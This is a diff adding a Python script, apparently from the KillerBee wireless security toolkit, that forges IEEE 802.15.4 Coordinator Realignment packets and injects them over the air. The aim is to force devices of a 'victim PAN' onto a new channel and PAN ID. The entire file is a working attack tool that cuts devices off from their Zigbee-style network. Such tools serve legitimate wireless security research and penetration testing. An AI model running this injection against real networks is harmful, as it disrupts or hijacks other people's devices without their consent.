@@ -1,0 +1,81 @@
+#!/usr/bin/env python
+
+# Contributed by Bryan Halfpap <Bryanhalf@gmail.com>, Copyright 2015
+
+import struct
+import binascii
+import sys
+import argparse
+from time import sleep
+
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # suppress annoying Scapy IPv6 warning
+from killerbee import *
+
+try:
+	from scapy.all import *
+except ImportError:
+	print 'This tool requires Scapy to be installed (specifically scapy-com edition).'
+	from sys import exit
+	exit(-1)
+
+
+def create_coord_realign(panid, coordinator, device, newchannel, newpanid, seqnum):
+    '''802.15.4 Coordinator Realignment Notification Packet'''
+    b = Dot15d4()/Dot15d4Cmd()/Dot15d4CmdCoordRealign()
+    b.fcf_panidcompress = 0 # shall be set to one
+    b.fcf_srcaddrmode = 3 # src shall be set to three (long addr)
+    b.fcf_destaddrmode = 3 #
+    b.fcf_pending = 0 # shall be set to zero
+    b.fcf_ackreq = 0 # shall be set to zero
+    #b.seqnum = seqnum
+    b.src_panid = panid 
+    b.dest_panid = 65535
+    b.cmd_id = 8 # Realignment Command
+    b.channel = newchannel # gotta change the channel
+    b.dest_addr = args.device #coordinator
+    b.src_addr = args.longcoord #panid#coordinator    
+    pkt = str(b)
+    #TODO: Update scapy-com to support the needed fields:
+    # direct support for this in Dot15d4 was lacking - add required fields manually until I can patch.
+    pkt = pkt[:24] + struct.pack('<H',newpanid) + pkt[26:] # the NEW PAN ID 
+    pkt = pkt[:29] + struct.pack('<H',args.deviceshort)  + pkt[31:] # short address of realignment message target 
+    pkt = pkt[:26] + struct.pack('<H',args.coordinator) + pkt[28:] # The short address of the coordinator (new)
+    return pkt
+
+
+if __name__ == '__main__':
+    tohex = lambda s: int(s.replace(':', ''), 16)
+    # Command-line arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
+    parser.add_argument('-i', '--interface', action='store', dest='devstring', default=None)
+    parser.add_argument('-p', '--panid', help="The current PAN ID of the victim PAN", action='store', required=True, type=tohex)
+    parser.add_argument('-s', '--coordinator', help="Realignment packet coordinator short address", action='store', required=True, type=tohex)
+    parser.add_argument('-l', '--longcoord', help="The long address of the coordinator", action='store', required=True, type=tohex)
+    parser.add_argument('-d', '--device', help="Destination device long address", action='store', required=True, type=tohex)
+    parser.add_argument('-e', '--deviceshort', help="Realignment packet device short address", action='store', required=True, type=tohex)
+    parser.add_argument('-q', '--srcseq', action='store', default=254, type=int)
+    parser.add_argument('-z', '--srcseqzbnwk', action='store', default=254, type=int)
+    parser.add_argument('--newchannel', help="The channel to re-align the PAN with", action='store', required=True, type=int)
+    parser.add_argument('--newpanid', help="The new PANID to re-alight the target PAN with", action='store', required=True, type=tohex)
+    parser.add_argument('--numloops', action='store', default=1, type=int)
+    args = parser.parse_args()
+
+    print("Expecting {2:#016x} to be the coordinator on network (PAN ID) {0:#04x}, located on channel {1}.".format(args.panid, args.channel, args.coordinator))
+    #TODO: seqnums for each direction
+
+    kb = KillerBee(device=args.devstring)
+    kb.set_channel(args.channel)
+
+    seqnummac = args.srcseq
+
+    for loopnum in range(0, args.numloops):
+        seqnummac += 1
+        sp2 = create_coord_realign(args.panid, args.coordinator, args.device, args.newchannel, args.newpanid, seqnummac)
+        seqnummac += 1
+        if seqnummac > 255:
+            seqnummac = 0
+        kb.inject(sp2) # already made it a string to get around limitation in dot14d4
+        sleep(0.005)
+
